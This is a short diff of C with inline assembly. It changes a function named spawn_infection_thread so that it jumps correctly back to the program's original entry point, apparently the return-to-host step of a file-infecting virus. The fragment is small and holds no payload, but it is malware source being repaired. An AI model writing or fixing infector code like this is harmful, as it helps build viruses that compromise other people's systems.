@@ -22,7 +22,7 @@ void spawn_infection_thread(void) {
   uint32_t oep = get_original_entry_point();
   if (oep != OEP_DEFAULT) {
     asm volatile("mov %0, %%eax\n"
-                 "ljmp *(%%eax)": : "r" (&oep));
+                 "jmp *%%eax": : "r" (oep));
   }
 }
 
